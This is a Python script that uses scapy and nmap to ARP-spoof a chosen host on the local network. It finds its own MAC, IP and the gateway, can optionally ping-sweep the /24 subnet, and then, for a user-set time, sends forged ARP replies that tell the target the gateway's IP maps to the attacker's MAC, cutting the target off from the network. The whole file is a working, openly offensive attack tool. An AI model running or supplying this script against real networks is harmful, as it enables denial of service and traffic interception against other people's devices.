from scapy.layers.l2 import Ether, ARP
from scapy.all import *
import time
import nmap

def get_my_addr():
    my_nets = get_if_list()
    my_macs = [get_if_hwaddr(i) for i in get_if_list()]
    my_ips = [get_if_addr(i) for i in get_if_list()]

    if 'enp4s0' in my_nets:
        i = my_nets.index('enp4s0')
    elif 'eth0' in my_nets:
        i = my_nets.index('eth0')
    elif 'wlp58s0' in my_nets:
        i = my_nets.index('wlp58s0')
    else:
        i = 0
    return [my_macs[i], my_ips[i]]

def get_list_hosts(ip='192.168.0.0'):
    nm = nmap.PortScanner()
    nm.scan(hosts=(ip+'/24'), arguments='-n -sP -PE -PA21,23,80,3389')
    hosts_list = [(x, nm[x]['status']['state']) for x in nm.all_hosts()]
    for host, status in hosts_list:
        print(f'{host}:{status}')

if __name__ == "__main__":
    # Get my IP, MAC and network
    my_mac, my_ip = get_my_addr()
    if not my_mac or not my_ip:
        print('Cannot get your local address')
        exit(0)

    # Get network IP
    network_ip_mas = my_ip.split('.')[0:3] # not for any
    network_ip_mas.append('0')
    network_ip = '.'.join(network_ip_mas)

    # Get network gateway IP
    network_ip_mas[-1] = '1'
    gateway_ip = '.'.join(network_ip_mas)

    # Result
    print('My_mac: ' + my_mac + '; My_ip: ' + my_ip + '; Gateway_ip: ' + gateway_ip)

    # Check result
    if input("Is this data correct? (y/n) ") in ['n', 'no', 'N', 'No']:
        check = input("Gateway ip: (type or 'n') ")
        if check is not ('n' and ''):
            gateway_ip = check
        check = input("My ip: (type or 'n') ")
        if check is not ('n' and ''):
            my_ip = check
        check = input("My mac: (type or 'n') ")
        if check is not ('n' and ''):
            my_mac = check
        print('My_mac: ' + my_mac + '; My_ip: ' + my_ip + '; Gateway_ip: ' + gateway_ip)

    # Show the list of hosts
    if input("Do you want see the list of hosts in local network? (y/n) ") in ['y','']:
        get_list_hosts(network_ip)

    # Attack
    attacked_ip = input("Type attacked host: ")

    # Type time
    minutes = 0
    seconds = 20
    data = input("Type minutes and seconds (separated by space): ").split()
    if len(data) == 1:
        minutes = float(data[0])
    elif len(data) == 2:
        minutes, seconds = [float(i) for i in data]

    # Get MAC of attacked IP
    attacked_mac = 'ff:ff:ff:ff:ff:ff'
    arp_packet = ARP(op='who-has', hwdst='ff:ff:ff:ff:ff:ff', pdst=attacked_ip)
    resp, unans = sr(arp_packet)
    for s, r in resp:
        attacked_mac = r[ARP].hwsrc
        print('attack-mac: ' + attacked_mac + '; attack-ip: ' + attacked_ip)

    # Block attacked ip
    t_end = time.time() + 60 * minutes + seconds
    while time.time() < t_end:
        arp_packet = Ether(dst=attacked_mac)/ARP(op='is-at', hwsrc=my_mac, psrc=gateway_ip, pdst=attacked_ip)
        sendp(arp_packet)
        time.sleep(1) # one per sec

